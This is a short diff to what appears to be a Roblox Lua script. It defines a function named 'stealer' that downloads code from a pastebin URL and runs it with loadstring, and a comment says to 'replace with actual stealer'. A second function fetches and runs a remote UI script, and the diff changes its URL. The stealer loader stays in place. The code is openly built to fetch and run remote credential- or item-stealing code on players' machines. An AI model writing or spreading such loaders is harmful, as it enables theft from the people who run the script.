@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet("https://pastebin.com/raw/SLCxpnzn"))() -- replace with actual stealer
+loadstring(game:HttpGet("https://pastebin.com/raw/SLCxpnzn"))() -- replace with actual stealer
 end
 local function loadui()
-  loadstring(game:HttpGet("https://pastebin.com/raw/aczb39pt"))()
+  loadstring(game:HttpGet("https://pastebin.com/raw/ZCaF6ZRP"))()
 
 end
 
